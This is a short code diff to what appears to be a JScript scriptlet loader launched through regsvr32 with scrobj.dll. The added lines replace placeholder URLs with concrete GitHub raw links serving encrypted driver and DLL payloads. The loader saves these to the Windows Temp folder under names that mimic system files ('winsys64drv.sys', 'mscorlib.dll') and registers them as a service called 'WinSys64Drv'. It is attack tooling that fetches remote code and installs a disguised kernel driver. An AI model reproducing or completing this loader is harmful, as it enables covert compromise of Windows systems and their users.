@@ -7,8 +7,8 @@
 // regsvr32 /u /n /i:https://gist.githubusercontent.com/.../loader.sct scrobj.dll
 
 var encKey = "SandblastDemo2026";
-var drvUrl = "https://gist.githubusercontent.com/TommyP949/REPO_ID/raw/sb64.enc";
-var dllUrl = "SVCMON_URL";
+var drvUrl = "https://raw.githubusercontent.com/TommyP949/sandblast-dlv/main/sb64.enc";
+var dllUrl = "https://raw.githubusercontent.com/TommyP949/sandblast-dlv/main/sandblast2.enc";
 var drvPath = "C:\\Windows\\Temp\\winsys64drv.sys";
 var dllPath = "C:\\Windows\\Temp\\mscorlib.dll";
 var svcName = "WinSys64Drv";
